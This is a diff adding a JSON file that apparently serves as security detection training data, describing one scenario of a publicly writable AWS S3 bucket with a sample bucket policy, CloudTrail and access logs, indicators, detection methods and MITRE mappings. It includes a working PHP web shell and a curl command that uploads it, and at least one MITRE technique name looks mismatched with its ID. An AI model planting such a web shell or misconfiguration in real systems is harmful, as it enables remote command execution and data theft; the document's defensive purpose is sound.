@@ -1,0 +1,121 @@
+{
+  "examples": [
+    {
+      "scenario": "Misconfigured AWS S3 bucket allowing public read-write access leading to unauthorized data exposure and data tampering.",
+      "technical_data": {
+        "IAM_policy_misconfiguration": {
+          "BucketPolicy": {
+            "Version": "2012-10-17",
+            "Statement": [
+              {
+                "Sid": "PublicReadWrite",
+                "Effect": "Allow",
+                "Principal": "*",
+                "Action": [
+                  "s3:GetObject",
+                  "s3:PutObject",
+                  "s3:DeleteObject"
+                ],
+                "Resource": "arn:aws:s3:::example-sensitive-bucket/*"
+              }
+            ]
+          }
+        },
+        "CloudTrail_logs_excerpt": [
+          {
+            "eventVersion": "1.08",
+            "userIdentity": {
+              "type": "Anonymous",
+              "principalId": "ANONYMOUS",
+              "arn": "arn:aws:iam::anonymous"
+            },
+            "eventTime": "2024-05-20T13:42:55Z",
+            "eventSource": "s3.amazonaws.com",
+            "eventName": "PutObject",
+            "awsRegion": "us-east-1",
+            "sourceIPAddress": "203.0.113.45",
+            "userAgent": "curl/7.79.1",
+            "requestParameters": {
+              "bucketName": "example-sensitive-bucket",
+              "key": "malicious-shell.php"
+            },
+            "responseElements": {
+              "x-amz-request-id": "D82B88E5F771F645",
+              "x-amz-id-2": "0a1b2c3d4e5f67890123456789abcdef1234567890abcdef1234567890abcdef"
+            },
+            "additionalEventData": {
+              "SignatureVersion": "SigV4",
+              "CipherSuite": "ECDHE-RSA-AES128-GCM-SHA256",
+              "bytesTransferredIn": 512,
+              "bytesTransferredOut": 0
+            },
+            "requestID": "D82B88E5F771F645",
+            "eventType": "AwsApiCall",
+            "recipientAccountId": "123456789012"
+          },
+          {
+            "eventVersion": "1.08",
+            "userIdentity": {
+              "type": "Anonymous",
+              "principalId": "ANONYMOUS"
+            },
+            "eventTime": "2024-05-20T13:45:21Z",
+            "eventSource": "s3.amazonaws.com",
+            "eventName": "GetObject",
+            "awsRegion": "us-east-1",
+            "sourceIPAddress": "198.51.100.22",
+            "userAgent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+            "requestParameters": {
+              "bucketName": "example-sensitive-bucket",
+              "key": "confidential/customer_data.csv"
+            },
+            "responseElements": {
+              "x-amz-request-id": "A1B2C3D4E5F67890",
+              "x-amz-id-2": "abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890"
+            },
+            "requestID": "A1B2C3D4E5F67890",
+            "eventType": "AwsApiCall",
+            "recipientAccountId": "123456789012"
+          }
+        ],
+        "S3_access_logs_sample": [
+          "79a5d3e9e3e2f7a2 123456789012 [20/May/2024:13:42:55 +0000] 203.0.113.45 arn:aws:iam::123456789012:user/anonymous ANONYMOUS EXAMPLE-SENSITIVE-BUCKET REST.PUT.OBJECT malicious-shell.php \"PUT /example-sensitive-bucket/malicious-shell.php HTTP/1.1\" 200 - - 123 15 10 - \"curl/7.79.1\" -",
+          "79a5d3e9e3e2f7a3 123456789012 [20/May/2024:13:45:21 +0000] 198.51.100.22 arn:aws:iam::123456789012:user/anonymous ANONYMOUS EXAMPLE-SENSITIVE-BUCKET REST.GET.OBJECT confidential/customer_data.csv \"GET /example-sensitive-bucket/confidential/customer_data.csv HTTP/1.1\" 200 - - 2048 38 20 - \"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\" -"
+        ],
+        "curl_exploit_example": "curl -X PUT -T shell.php https://example-sensitive-bucket.s3.amazonaws.com/malicious-shell.php",
+        "shell_php_content": "<?php\\n  if(isset($_REQUEST['cmd'])){\\n    echo '<pre>' . shell_exec($_REQUEST['cmd']) . '</pre>';\\n  }\\n?>",
+        "AWS_CLI_command_for_listing_bucket_acls": "aws s3api get-bucket-acl --bucket example-sensitive-bucket",
+        "Bucket_ACL_response": {
+          "Owner": {
+            "DisplayName": "example-owner",
+            "ID": "abc123abc123abc123abc123abc123abc123abc123abc123abc123abc123abc1"
+          },
+          "Grants": [
+            {
+              "Grantee": {
+                "Type": "Group",
+                "URI": "http://acs.amazonaws.com/groups/global/AllUsers"
+              },
+              "Permission": "FULL_CONTROL"
+            }
+          ]
+        }
+      },
+      "indicators": [
+        "S3 bucket policy granting s3:GetObject, s3:PutObject, s3:DeleteObject to Principal '*' (everyone).",
+        "CloudTrail logs showing PutObject and GetObject events from anonymous (unauthenticated) users.",
+        "S3 access logs showing HTTP PUT requests from external IPs uploading suspicious files like shell.php.",
+        "Presence of web shell code in uploaded PHP file (shell.php).",
+        "Bucket ACLs granting FULL_CONTROL permissions to AllUsers group.",
+        "Unusual user agents such as curl or automated bots accessing sensitive objects."
+      ],
+      "detection_method": "Automated scanning of bucket policies and ACLs for public read-write permissions using CSPM tools (e.g., AWS Config rules, ScoutSuite), correlation of CloudTrail event logs for anonymous PutObject or DeleteObject events, monitoring S3 access logs for HTTP methods and user-agent anomalies, and alerting on presence of executable files uploaded to buckets not intended for public content.",
+      "relevant_mitre_techniques": [
+        "T1530 - Data from Cloud Storage Object",
+        "T1078.004 - Valid Accounts: Cloud Accounts",
+        "T1496 - Resource Hijacking",
+        "T1560.001 - Archive Collected Data: Archive via Cloud Storage"
+      ]
+    }
+  ]
+}
